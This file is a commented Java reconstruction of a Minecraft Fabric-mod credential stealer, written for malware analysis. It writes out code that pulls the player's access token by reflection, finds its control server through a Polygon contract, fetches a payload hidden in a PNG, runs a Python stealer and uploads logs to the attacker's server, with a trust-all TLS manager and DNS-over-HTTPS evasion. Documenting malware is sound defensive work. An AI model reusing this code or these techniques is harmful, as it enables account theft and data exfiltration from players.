/*
 * GrimClientStealer - readable reconstruction of net.fabric.* from Grim_Client_1.0.jar
 * ====================================================================================
 * Documentation only: this malware is analysed to document it, not to be reused. It is not the
 * original source but a renamed reconstruction of what the deobfuscated classes do; the tool
 * output that keeps the original names is in ../deobfuscated/.
 *
 *   net.fabric.reo_qrox_ebgg_jhss  -> Launcher         (Main-Class)
 *   net.fabric.hkonjkz             -> FabricEntrypoint (ModInitializer)
 *   net.fabric.btcValue            -> Dropper          (the payload logic)
 *   net.fabric.znIHc               -> SessionHijack    (reflection into Minecraft)
 *   net.fabric.tmpSikxuafu         -> RawHttp          (hand-rolled HTTPS + DNS-over-HTTPS)
 */

public final class GrimClientStealer {

    /* ------------------------------------------------------------------ constants */

    /** Campaign / build id, sent as "sessionId" to /shard/prefireMc.  [btcValue.fpxh()] */
    static final String CAMPAIGN_ID = "fc4a86d2-38e2-4f28-980c-22860f4037cb";

    /** C2-holding contract on Polygon mainnet.                        [btcValue.GXxiYd0()] */
    static final String C2_CONTRACT = "0x9c0a507300fd902787bb193d80fca5ce6e1bff9a";

    /** Selector of the no-arg function returning the domain as an ABI string.
     *  [btcValue.PlF8OQtCEJEk()] - built at runtime from char arithmetic, which is why
     *  it does not appear as a literal in the class file. */
    static final String C2_SELECTOR = "0xce6d41de";

    /** Public RPC endpoints, tried in order.                          [btcValue.uYdlie()] */
    static final String[] POLYGON_RPCS = {
        "https://polygon.drpc.org",
        "https://polygon-bor-rpc.publicnode.com",
        "https://1rpc.io/matic",
        "https://api.zan.top/polygon-mainnet",
        "https://rpc-mainnet.matic.quiknode.pro",
    };

    /** Used only if every RPC fails - and, at the time of analysis, also the value the
     *  contract itself returns.                                      [btcValue.MOKr3()] */
    static final String FALLBACK_DOMAIN = "thisisafalsepositive.st";

    /** Second stage: a ZIP hidden inside a PNG chunk.              [btcValue.endSaiueejfw()] */
    static final String RUNTIME_PATH = "/cdn/v2/9f4e7a2c1b8d.png";

    /* ------------------------------------------------------------------ Launcher (java -jar) */

    /** net.fabric.reo_qrox_ebgg_jhss.main
     *  If started without "-restarted", copy itself into the hidden workdir and re-exec
     *  detached, so the parent (browser/zip/whatever) exits immediately. */
    static void launcherMain(String[] args) throws Exception {
        java.nio.file.Path work = workDir();          // %LOCALAPPDATA%\Microsoft\Windows\NtProfileIndex
        java.nio.file.Files.createDirectories(work);

        if (!hasFlag(args, "-restarted")) {
            String jreBin = System.getProperty("java.home") + java.io.File.separator + "bin";
            String javaw  = pathExists(jreBin + java.io.File.separator + "javaw.exe")
                          ? jreBin + java.io.File.separator + "javaw.exe"
                          : jreBin + java.io.File.separator + "java.exe";
            String self   = codeSourceJar();

            ProcessBuilder pb = new ProcessBuilder(javaw, "-cp", self,
                                                   "net.fabric.btcValue", /* base64 context */ encode(
                                                      "{\"userId\":\"" + randomUserId() +
                                                      "\",\"tag\":\"Default\"" +
                                                      ",\"domain\":\"\"" +
                                                      ",\"env\":\"DoubleClick\"}"));
            pb.redirectInput(ProcessBuilder.Redirect.from(new java.io.File("NUL")));
            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(work.resolve("_spawn.log").toFile()));
            pb.redirectErrorStream(true);
            pb.directory(work.toFile());
            pb.start();
            return;
        }
        new Dropper().execute(args);
    }

    /* ------------------------------------------------------------------ FabricEntrypoint (mod load) */

    /** net.fabric.hkonjkz.onInitialize - runs on Fabric mod load. */
    static void fabricOnInitialize() {
        Thread t = new Thread(() -> {
            try {
                // 1. steal the live session out of the running game
                String username   = SessionHijack.username();
                String uuid       = SessionHijack.uuid();
                String accessToken = SessionHijack.accessToken();

                String mcInfo = base64("{\"username\":\"" + username +
                                       "\",\"uuid\":\"" + uuid +
                                       "\",\"accessToken\":\"" + accessToken + "\"}");

                // 2. build the context handed to the detached process
                String ctx = base64("{\"mcInfo\":\"" + mcInfo +
                                    "\",\"prefireId\":\"" + prefireId +
                                    "\",\"userId\":\"" + userId +
                                    "\",\"tag\":\"" + tag +
                                    "\",\"domain\":\"" + domain +
                                    "\",\"gameDir\":\"" + gameDir() +      // options.txt / config / mods / %APPDATA%\.minecraft
                                    "\",\"mcUsername\":\"" + username +
                                    "\",\"mcUuid\":\"" + uuid +
                                    "\",\"env\":\"Fabric\"}");

                // 3. re-exec the same jar detached into the hidden workdir
                java.nio.file.Path work = workDir();
                ProcessBuilder pb = new ProcessBuilder(javaw(), "-cp", codeSourceJar(),
                                                       "net.fabric.btcValue", ctx);
                pb.redirectInput(ProcessBuilder.Redirect.from(new java.io.File("NUL")));
                pb.redirectOutput(ProcessBuilder.Redirect.appendTo(work.resolve("_spawn.log").toFile()));
                pb.redirectErrorStream(true);
                pb.directory(work.toFile());
                pb.start();
            } catch (Exception ignored) { }           // never show the victim anything
        });
        t.setDaemon(true);
        t.start();
    }

    /* ------------------------------------------------------------------ SessionHijack */

    /** net.fabric.znIHc - reflection that survives Yarn / Mojmap / SRG naming. */
    static final class SessionHijack {
        static final String[] CLIENT_CLASSES = {
            "net.minecraft.class_310",              // intermediary
            "net.minecraft.client.Minecraft",       // mojmap (old)
            "net.minecraft.client.MinecraftClient"  // mojmap (new)
        };
        static final String[] INSTANCE   = {"getInstance", "method_1551", "instance", "field_1700"};
        static final String[] SESSION    = {"getSession", "getUser", "method_1548", "session", "user", "field_1726"};
        static final String[] USERNAME   = {"getUsername", "getName", "method_1676", "username", "name", "field_1982"};
        static final String[] UUID_GETTER= {"getUuidOrNull", "getProfileId", "getUuid", "method_44717", "uuid", "field_1985"};
        static final String[] TOKEN      = {"getAccessToken", "method_1674", "accessToken", "field_1983"};

        static String accessToken() { return read(TOKEN); }   // the actual prize: a live MS account token
        static String username()    { return read(USERNAME); }
        static String uuid()        { return read(UUID_GETTER); }
        // read(): walk client class -> instance -> session/user object -> field or getter,
        // trying every name above until one works.
        static String read(String[] candidates) { /* ... reflection loop ... */ return null; }
    }

    /* ------------------------------------------------------------------ Dropper */

    /** net.fabric.btcValue */
    static final class Dropper {

        String domain;          // cached C2 host
        java.nio.file.Path work;
        StringBuilder log = new StringBuilder();

        void execute(String[] args) throws Exception {
            work = workDir();
            java.nio.file.Files.createDirectories(work);
            log("========== DETACHED PROCESS STARTED ==========");

            Context c = parseContext(args[0]);                    // base64 JSON from the parent
            log("Context parsed - UserId: " + c.userId + ", Env: " + c.env);

            java.nio.file.Path python = work.resolve("python.exe");
            java.nio.file.Path mainPy = work.resolve("AppHost").resolve("main.py");

            if (java.nio.file.Files.exists(python) && java.nio.file.Files.exists(mainPy)) {
                log("Portable runtime already cached");
            } else if (!downloadRuntime()) {                      // 3 attempts, backoff 2s*n
                log("ERROR: Failed to setup portable runtime");
                exfiltrateLogs(c);
                return;
            }
            log("Spawning stealer...");
            spawnStealer(c);                                       // python.exe AppHost\main.py ...
            exfiltrateLogs(c);
        }

        /* ---------- C2 resolution: read the domain from a Polygon smart contract ---------- */
        String getDomain() {
            if (domain != null) return domain;
            String body = "{\"jsonrpc\":\"2.0\",\"method\":\"eth_call\",\"params\":[{\"to\":\""
                        + C2_CONTRACT + "\",\"data\":\"" + C2_SELECTOR + "\"},\"latest\"],\"id\":1}";
            for (String rpc : POLYGON_RPCS) {
                try {
                    RawHttp.Response r = RawHttp.post(rpc, body, "application/json");
                    if (r.statusCode == 200) {
                        String d = decodeAbiString(r.body);        // strip 0x, skip offset word, read len, ASCII
                        if (d != null && !d.isEmpty()) return domain = d;
                    }
                } catch (Exception ignored) { }
            }
            return domain = FALLBACK_DOMAIN;
        }

        /* ---------- registration ---------- */
        String prefire(String host, String userId) {
            String body = "{\"sessionId\":\"" + CAMPAIGN_ID + "\",\"userId\":\"" + userId + "\"}";
            RawHttp.Response r = RawHttp.post("https://" + host + "/shard/prefireMc", body, "application/json",
                java.util.Map.of("X-Edge-Cache-Revalidate", "stale-if-error",
                                 "X-Runtime-Env", "jre-embedded"));
            return jsonValue(r.body, "result");                    // -> prefireId
        }

        /* ---------- second stage: a ZIP inside a PNG ---------- */
        boolean downloadRuntime() {
            for (int attempt = 1; attempt <= 3; attempt++) {
                try {
                    byte[] png = RawHttp.getBytes("https://" + getDomain() + RUNTIME_PATH,
                        java.util.Map.of(
                            "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                                        + "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
                            "Accept", "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
                            "Accept-Language", "en-US,en;q=0.9",
                            "Sec-Fetch-Dest", "image",
                            "Sec-Fetch-Mode", "no-cors",
                            "Sec-Fetch-Site", "same-origin"));
                    log("Downloaded " + png.length + " bytes, extracting from image...");

                    byte[] zip = extractChunk(png);                // custom chunk "hIds" -> raw DEFLATE
                    if (zip == null) { log("PNG extraction failed"); continue; }
                    log("Extracted " + zip.length + " bytes from image, unpacking...");
                    int n = unzipInto(zip, work);                  // NOTE: entry names are not sanitised
                    log("Portable runtime ready (" + n + " files)");
                    return true;
                } catch (Exception e) {
                    log("Attempt " + attempt + " error: " + e.getMessage());
                    sleep(2000L * attempt);
                }
            }
            return false;
        }

        /** Walk the PNG chunk list and pull out the non-standard chunk whose type bytes are
         *  'h' 'I' 'd' 's' (104, 73, 100, 115). Its data is raw DEFLATE of a ZIP archive. */
        static byte[] extractChunk(byte[] png) {
            if (!java.util.Arrays.equals(java.util.Arrays.copyOfRange(png, 0, 8),
                    new byte[]{-119, 80, 78, 71, 13, 10, 26, 10})) return null;
            int p = 8;
            while (p + 8 <= png.length) {
                int len = (png[p] & 255) << 24 | (png[p+1] & 255) << 16 | (png[p+2] & 255) << 8 | png[p+3] & 255;
                if (png[p+4] == 104 && png[p+5] == 73 && png[p+6] == 100 && png[p+7] == 115) {
                    return inflateRaw(java.util.Arrays.copyOfRange(png, p + 8, p + 8 + len)); // java.util.Inflater, no zlib header
                }
                p += 12 + len;
            }
            return null;
        }

        /* ---------- run the Python stealer ---------- */
        void spawnStealer(Context c) throws Exception {
            java.util.List<String> cmd = new java.util.ArrayList<>();
            cmd.add(work.resolve("python.exe").toString());
            cmd.add("main.py");                                    // cwd is AppHost
            cmd.add("-u");
            cmd.add(c.userId);
            if (valid(c.env))  { cmd.add("--env");     cmd.add(c.env); }
            if (valid(c.tag))  { cmd.add("--tag");     cmd.add(c.tag); }
            if (valid(c.mcInfo))   { cmd.add("--mcInfo");   cmd.add(c.mcInfo); }   // base64 {username,uuid,accessToken}
            if (valid(c.prefireId)){ cmd.add("--prefireId");cmd.add(c.prefireId); }

            ProcessBuilder pb = new ProcessBuilder(cmd);
            pb.directory(work.resolve("AppHost").toFile());
            pb.redirectInput(ProcessBuilder.Redirect.from(new java.io.File("NUL")));
            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(work.resolve("_stealer.log").toFile()));
            pb.redirectErrorStream(true);
            log("Stealer spawned: pid=" + pb.start().pid());
        }

        /* ---------- exfiltrate the game log ---------- */
        void exfiltrateLogs(Context c) {
            if (getDomain() == null) return;
            StringBuilder out = new StringBuilder();

            java.nio.file.Path latest = java.nio.file.Path.of(c.gameDir, "logs", "latest.log");
            if (java.nio.file.Files.exists(latest)) {
                try {
                    String s = java.nio.file.Files.readString(latest);
                    if (s.length() > 5_000_000)                     // keep both ends of a huge log
                        s = s.substring(0, 2_500_000) + "\n=== TRUNCATED ===\n"
                          + s.substring(s.length() - 2_500_000);
                    out.append(s);
                } catch (Exception e) { out.append("ERROR reading MC log: ").append(e.getMessage()); }
            }
            out.append("\n\n========== DETACHED LOG ==========\n").append(log);
            out.append("\n\n========== RUNTIME ==========\n");
            out.append("jvm=").append(System.getProperty("java.version")).append('\n');
            out.append("os=").append(System.getProperty("os.name")).append('\n');
            out.append("user=").append(System.getProperty("user.name")).append('\n');

            String body = "{\"userId\":\"" + c.userId + "\",\"content\":\"" + jsonEscape(out.toString()) +
                          "\",\"filename\":\"combined.log\",\"mcUsername\":\"" + c.mcUsername +
                          "\",\"mcUuid\":\"" + c.mcUuid +
                          "\",\"executionEnvironment\":\"" + c.env + "-Detached\"}";
            RawHttp.post("https://" + getDomain() + "/shard/submitMinecraftLog", body, "application/json",
                java.util.Map.of("X-Edge-Cache-Revalidate", "stale-if-error",
                                 "X-Runtime-Env", "jre-embedded"));
        }

        static java.nio.file.Path workDir() {
            return java.nio.file.Path.of(System.getenv("LOCALAPPDATA"), "Microsoft", "Windows", "NtProfileIndex");
        }
    }

    /* ------------------------------------------------------------------ RawHttp */

    /** net.fabric.tmpSikxuafu - HTTP/1.1 over a raw SSLSocket, not HttpURLConnection. */
    static final class RawHttp {
        static final class Response { int statusCode; String body; byte[] bytes; java.util.Map<String,String> headers; }

        /* Trusts ANY certificate. Installed once in a static initialiser:
         *   SSLContext ctx = SSLContext.getInstance("TLS");
         *   ctx.init(null, new X509TrustManager[]{ new TrustAll() }, null);
         *   HttpsURLConnection.setDefaultSSLSocketFactory / SSLSocket creation uses it.
         * Consequence: a MITM on the C2 channel is accepted silently. */
        static final class TrustAll implements javax.net.ssl.X509TrustManager {
            public void checkClientTrusted(java.security.cert.X509Certificate[] c, String a) { }
            public void checkServerTrusted(java.security.cert.X509Certificate[] c, String a) { }
            public java.security.cert.X509Certificate[] getAcceptedIssuers() { return new java.security.cert.X509Certificate[0]; }
        }

        /* Hostnames are NOT resolved by the OS: a raw DNS query is sent to 1.1.1.1:443 as
         *   GET /dns-query?dns=<base64url(dns message)> HTTP/1.1
         *   Host: cloudflare-dns.com
         *   Accept: application/dns-message
         * over an already-established TLS socket, cached for 5 minutes. This keeps the C2
         * lookup out of the OS resolver cache and out of local DNS logs. */
        static String resolveOverDoH(String host) { return null; /* ... */ }
    }

    /* ------------------------------------------------------------------ helpers (elided) */
    static boolean hasFlag(String[] a, String f) { return false; }
    static boolean pathExists(String p) { return false; }
    static String codeSourceJar() { return null; }
    static String javaw() { return null; }
    static String randomUserId() { return null; }
    static String base64(String s) { return java.util.Base64.getEncoder().encodeToString(s.getBytes(java.nio.charset.StandardCharsets.UTF_8)); }
    static String encode(String s) { return base64(s); }
    static Context parseContext(String b64) { return null; }
    static String jsonValue(String json, String key) { return null; }
    static String jsonEscape(String s) { return null; }
    static byte[] inflateRaw(byte[] d) { return null; }
    static int unzipInto(byte[] zip, java.nio.file.Path dir) { return 0; }
    static String decodeAbiString(String hex) { return null; }
    static boolean valid(String s) { return s != null && !s.equals("null"); }
    static void sleep(long ms) { }
    static void log(String s) { }
    static String gameDir() { return null; }
    static String prefireId, userId, tag, domain;

    static final class Context {
        String mcInfo, prefireId, userId, tag, domain, gameDir, mcUsername, mcUuid, env;
    }
}
